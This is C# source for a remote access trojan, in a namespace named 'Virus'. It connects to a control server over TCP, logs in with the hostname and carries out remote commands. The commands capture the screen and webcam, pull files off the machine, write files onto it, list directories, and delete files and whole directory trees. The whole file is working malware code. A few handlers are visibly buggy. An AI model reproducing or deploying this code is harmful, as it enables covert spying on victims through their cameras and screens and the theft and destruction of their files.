using System;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;
using FlashCap;

namespace Virus {
	class Program {
		private static byte[]? moarData = null;
		private static Socket? sock;

		private static void Main(string[] args) {
			while (true) {
				try { Connect(); }
				catch (Exception ex) { Console.WriteLine(ex); }
				moarData = null;
			}
		}
		private static void Connect() {
			sock = new Socket(SocketType.Stream, ProtocolType.Tcp);
			sock.Connect("127.0.0.1", 42069);
			new Message(Message.Type.Login, System.Net.Dns.GetHostName()).Send(sock);
			
			while (sock.Connected) {
				Message? msg = null;
				try { msg = Shared.Read(sock, ref moarData); }
				catch (SocketException) { sock.Close(); }
				catch (IOException) { sock.Close(); }
				if (msg == null) continue;

				HandleMessage(msg);
			}
			sock.Close();
		}

		private static void HandleMessage(Message msg) {
			if (sock == null) return;
			switch (msg.type) {
			 case Message.Type.Heartbeat:
				Console.WriteLine("hb");
				new Message(Message.Type.Heartbeat).Send(sock);
				break;

			 case Message.Type.Screenshot:
				Rectangle bounds = Screen.GetBounds(Point.Empty);
				using(MemoryStream memStream = new MemoryStream()) {
					using(Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height)) {
						using(Graphics g = Graphics.FromImage(bitmap)) {
							g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
						}
					}
					new Message(Message.Type.Screenshot, memStream.ToArray()).Send(sock);
				}
				break;

			 case Message.Type.CamEnum:
				CaptureDevices capDev = new CaptureDevices();
				CaptureDeviceDescriptor[] capDevDesks = capDev.GetDescriptors().ToArray();
				string cams = string.Empty;
				foreach (CaptureDeviceDescriptor desk in capDevDesks) { 
					cams += desk.ToString() + "\n";
					foreach (VideoCharacteristics vidChar in desk.Characteristics)
						cams += "\t" + vidChar.ToString() + "\n";
				}
				new Message(Message.Type.CamEnum, cams).Send(sock);
				break;

			 case Message.Type.Camerashot:
				if (msg.body[0] < 1 || msg.body[0] > 2) {
					new Message(Message.Type.Message, "Camerashot: <camera> [profile]").Send(sock);
					break;
				}
				string camName = Encoding.ASCII.GetString(msg.body.Skip(2).Take(msg.body[1]).ToArray());

				CaptureDevices capDev2 = new CaptureDevices();
				CaptureDeviceDescriptor? capDevDesk = capDev2.GetDescriptors().FirstOrDefault(d => d.Name == camName);
				if (capDevDesk == null) {
					new Message(Message.Type.Message, "Camerashot: Cannot find device with the name \""+camName+"\"").Send(sock);
					break;
				}

				VideoCharacteristics? capDevVidChars = null;
				if (msg.body[0] == 2) {
					string charsStr = Encoding.ASCII.GetString(msg.body.Skip(2+msg.body[1]).ToArray());
					capDevVidChars = capDevDesk.Characteristics.FirstOrDefault(c => c.ToString() == charsStr);
					if (capDevVidChars == null) {
						new Message(Message.Type.Message, "Camerashot: Cannot find characteristics with the name \""+charsStr+"\"").Send(sock);
						break;
					}
				} else {
					capDevVidChars = capDevDesk.Characteristics.FirstOrDefault(c => c.PixelFormat != PixelFormats.Unknown);
					VideoCharacteristics? capDevVidChars2 = capDevDesk.Characteristics.FirstOrDefault();
					if (capDevVidChars2 == null) {
						new Message(Message.Type.Message, "Camerashot: Cannot find applicable device characteristics").Send(sock);
						break;
					} else if (capDevVidChars == null) {
						new Message(Message.Type.Message, "Camerashot: Cannot find preferrable device characteristics, defaulting to unknown").Send(sock);
						capDevVidChars = capDevVidChars2;
					}
				}

				byte[] cap = capDevDesk.TakeOneShotAsync(capDevVidChars, default).Result;
				PixelFormats pxlfmt = capDevVidChars.PixelFormat;

				List<byte> greg = new List<byte>();
				greg.AddRange(Encoding.ASCII.GetBytes( pxlfmt==PixelFormats.Unknown? "unkNwN" : pxlfmt.ToString().PadLeft(6,'_') ));
				greg.AddRange(cap);
				Console.WriteLine(2);
				new Message(Message.Type.Camerashot, greg).Send(sock);
				Console.WriteLine(3);
				break;

			 case Message.Type.F2S:
				string filepath = string.Empty;
				if (!msg.TryGetString(out filepath)) {
					new Message(Message.Type.Message, "Invalid string").Send(sock);
					break;
				}
				if (!File.Exists(filepath)) {
					new Message(Message.Type.Message, "File not found").Send(sock);
					break;
				}
				byte[] file = File.ReadAllBytes(filepath);
				filepath = Path.GetFullPath(filepath);

				List<byte> greg2 = new List<byte>();
				greg2.AddRange(BitConverter.GetBytes(filepath.Length));
				greg2.AddRange(Encoding.ASCII.GetBytes(filepath));
				greg2.AddRange(file);
				new Message(Message.Type.F2S, greg2);
				break;


			 case Message.Type.F2C:
				int fnsize = BitConverter.ToInt32(msg.body.Take(4).ToArray());
				string filepath2 = Encoding.ASCII.GetString(msg.body.Skip(4).Take(fnsize).ToArray());
				if (!Directory.Exists(Path.GetDirectoryName(filepath2))) {
					new Message(Message.Type.Message, "Parent directory doesn't exists").Send(sock);
					break;
				}
				byte[] file2 = msg.body.Skip(4+fnsize).ToArray();
				File.WriteAllBytes(filepath2, file2);
				new Message(Message.Type.Message, "Wrote "+file2.Length.ToString()+Shared.SizeSuffix(file2.Length)+" to \""+filepath2+"\"").Send(sock);
				break;

			 case Message.Type.Ls:
				string path;
				if (!msg.TryGetString(out path)) {
					new Message(Message.Type.Message, "Invalid string").Send(sock);
				} else if (Directory.Exists(path)) {
					string list = "Listing of "+path+"\nDirectories: "+string.Join(", ", Directory.EnumerateDirectories(path).Select(d => "'"+Path.GetFileName(d)+"'"))+"\n";
					string[] fis = Directory.EnumerateFiles(path, "*", new EnumerationOptions() { AttributesToSkip = 0 })
						.Select(f => new FileInfo(f))
						.Select(f => Shared.AttributeString(f.Attributes)+f.LastWriteTime.ToString("  yy.MM.dd HH:mm  ")+Shared.SizeSuffix(f.Length)+"%S'"+f.Name+"'")
						.ToArray();

					int spaces = 0;
					for (int i = 0; i < fis.Length; i++) {
						int ind = fis[i].IndexOf("%S");
						if (ind > spaces) spaces = ind;
					}
					spaces += 2;
					for (int i = 0; i < fis.Length; i++) {
						int ind = fis[i].IndexOf("%S");
						fis[i] = fis[i].Replace("%S", new String(' ', spaces-ind));
					}
					list += string.Join('\n', fis);
					new Message(Message.Type.Message, list).Send(sock);
			 	} else if (File.Exists(path)) {
			 		FileInfo fi = new FileInfo(path);
			 		string file3 = Shared.AttributeString(fi.Attributes)+fi.LastWriteTime.ToString("  yy.MM.dd HH:mm  ")+Shared.SizeSuffix(fi.Length)+"%S'"+fi.Name+"'";
					new Message(Message.Type.Message, file3).Send(sock);
			 	} else new Message(Message.Type.Message, "Path does not exists").Send(sock);
				break;

			 case Message.Type.MkDir:
				string path2;
				if (!msg.TryGetString(out path2)) {
					new Message(Message.Type.Message, "Invalid string").Send(sock);
				} else if (Directory.Exists(path2)) {
					new Message(Message.Type.Message, "Directory already exists").Send(sock);
				} else if (File.Exists(path2)) {
					new Message(Message.Type.Message, "Specified path is a file").Send(sock);
				} else if (Path.Exists(path2)) {
					new Message(Message.Type.Message, "Specified path already exists (but is neither a file nor a directory, wtf?)").Send(sock);
				} else {
					Directory.CreateDirectory(path2);
					new Message(Message.Type.Message, "Directory created successfully").Send(sock);
				}
				break;

			 case Message.Type.RmDir:
				string path3;
				if (!msg.TryGetString(out path3)) {
					new Message(Message.Type.Message, "Invalid string").Send(sock);
				} else if (!Directory.Exists(path3)) {
					new Message(Message.Type.Message, "Directory doesn't exist").Send(sock);
				} else if (File.Exists(path3)) {
					new Message(Message.Type.Message, "Specified path is a file").Send(sock);
				} else if (Path.Exists(path3)) {
					new Message(Message.Type.Message, "Specified path already exists (but is neither a file nor a directory, wtf?)").Send(sock);
				} else if (Directory.GetFiles(path3).Length > 0) {
					new Message(Message.Type.Message, "Directory isn't empty").Send(sock);
				} else {
					Directory.Delete(path3);
					new Message(Message.Type.Message, "Directory deleted successfully").Send(sock);
				}
				break;

			 case Message.Type.Rm:
				string path4;
				if (!msg.TryGetString(out path4)) {
					new Message(Message.Type.Message, "Invalid string").Send(sock);
				} else if (!File.Exists(path4)) {
					new Message(Message.Type.Message, "File doesn't exist").Send(sock);
				} else if (Directory.Exists(path4)) {
					new Message(Message.Type.Message, "Specified path is a directory").Send(sock);
				} else if (Path.Exists(path4)) {
					new Message(Message.Type.Message, "Specified path already exists (but is neither a file nor a directory, wtf?)").Send(sock);
				} else {
					File.Delete(path4);
					new Message(Message.Type.Message, "File deleted successfully").Send(sock);
				}
				break;

			 case Message.Type.RR:
				string path5;
				if (!msg.TryGetString(out path5)) {
					new Message(Message.Type.Message, "Invalid string").Send(sock);
				} else if (File.Exists(path5)) {
					File.Delete(path5);
					new Message(Message.Type.Message, "File deleted successfully").Send(sock);
				} else if (Directory.Exists(path5)) {
					new DirectoryInfo(path5).Delete(true);
					new Message(Message.Type.Message, "Directory deleted successfully").Send(sock);
				} else if (Path.Exists(path5)) {
					new Message(Message.Type.Message, "Specified path is neither a file nor a directory, wtf?").Send(sock);
				} else {
					new Message(Message.Type.Message, "Specified path doesn't exists").Send(sock);
				}
				break;

			 default:
				break;
			}
		}
	}
}